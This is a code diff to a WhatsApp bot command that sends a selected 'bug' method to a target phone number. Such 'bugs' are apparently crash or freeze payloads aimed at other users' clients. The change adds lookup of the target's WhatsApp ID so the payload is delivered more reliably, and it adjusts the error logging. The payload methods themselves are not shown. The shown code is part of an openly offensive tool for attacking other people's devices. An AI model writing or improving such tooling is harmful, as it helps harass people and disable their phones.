@@ -21,14 +21,24 @@ let handler = async (m, { sock, args, usedPrefix, command }) => {
         return m.reply(`❌ Method *${method}* not found.\nType *.methods* to see the list.`);
     }
 
-    await m.reply(`🚀 Sending bug *${method}* to target *${target}*...`);
+    // Resolve phone number JID to LID for proper delivery
+    let resolved = target;
+    try {
+        const check = await sock.onWhatsApp(target.replace("@s.whatsapp.net", ""));
+        if (check && check[0]?.jid) {
+            resolved = check[0].jid;
+        }
+    } catch {
+        // Fallback to original target if resolution fails
+    }
+
+    await m.reply(`🚀 Sending bug *${method}* to target *${resolved}*...`);
 
     try {
-        // As per user case: await protocolbug8(isTarget, true)
-        await bugMethods[method](sock, target, true);
+        await bugMethods[method](sock, resolved, true);
         await m.reply(`✅ Successfully relayed bug *${method}* to the target.`);
     } catch (e) {
-        sock.logger.error(e);
+        global.logger?.error({ error: e.message, stack: e.stack }, "Bug send error");
         await m.reply(`❌ Failed to send bug: ${e.message}`);
     }
 };
